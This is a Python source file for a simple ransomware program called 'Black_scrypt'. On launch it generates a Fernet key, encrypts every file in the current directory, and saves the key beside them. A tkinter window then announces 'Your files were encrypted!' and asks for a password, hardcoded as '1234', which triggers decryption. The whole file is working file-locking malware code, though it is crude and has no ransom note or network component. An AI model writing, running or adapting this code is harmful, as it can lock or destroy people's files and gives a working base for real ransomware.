import sys
import tkinter as tk
import os
from cryptography.fernet import Fernet


def decrypt():
    files = []
    for file in os.listdir():
        current_script = os.path.basename(sys.argv[0])
        if file == current_script or file == "current_key.key" or file == "terminal.ico":
            continue
        if os.path.isfile(file):
            files.append(file)

    with open("current_key.key", "rb") as key_decrypt:
        secret_key = key_decrypt.read()

    for file in files:
        with open(file, "rb") as current_file:
            content = current_file.read()
        content_decrypted = Fernet(secret_key).decrypt(content)

        with open(file, "wb") as current_file:
            current_file.write(content_decrypted)


def encrypt():
    key = Fernet.generate_key()
    files = []

    for file in os.listdir():
        current_script = os.path.basename(sys.argv[0])
        if file == current_script or file == "current_key.key" \
                or file == "terminal.ico":
            continue
        if os.path.isfile(file):
            files.append(file)

    with open("current_key.key", "wb") as current_key:
        current_key.write(key)

    for file_cript in files:
        with open(file_cript, "rb") as current_file:
            content = current_file.read()
            content_encrypted = Fernet(key=key).encrypt(content)

        with open(file_cript, "wb") as current_file:
            current_file.write(content_encrypted)


def check_pass(data):
    default_pass = ['1234']
    if not str(data) == default_pass[0]:
        return False
    return True


def finish_button_pressed():
    input_text = entry.get()
    if not input_text.strip() or not check_pass(input_text):
        error_label.config(
            text="Wrong password :(",
            fg='red')

    else:
        decrypt()
        entry.delete(0, tk.END)
        error_label.config(text="All good ;)", fg="green")
        finish_button.destroy()
        text_label.destroy()
        entry.destroy()


root_window = tk.Tk()
root_window.title("Black_scrypt")
root_window.geometry("375x407")
root_window.resizable(False, False)
root_window.iconbitmap("terminal.ico")

text = "Your files were encrypted!\nEnter the password to decrypt your files!"
text_label = tk.Label(
    root_window,
    text=text,
    font=("Helvetica", 13, 'bold'),
    wraplength=300,
    fg="black",
)
text_label.pack(pady=10)

entry = tk.Entry(
    root_window,
    width=20,
    font=("Arial", 15),
    justify="center",
    fg='#000000',
    bg="#C1CDCD"
)
entry.pack(pady=30)

error_label = tk.Label(
    root_window,
    text="",
    font=("Helvetica", 15, 'bold')
)
error_label.pack()

finish_button = tk.Button(
    root_window,
    text="Decrypt",
    command=finish_button_pressed,
    bg="green",
    fg="white",
    font=("BOLD", 15)
)
finish_button.pack(pady=10)

if __name__ == "__main__":
    encrypt()
    root_window.mainloop()
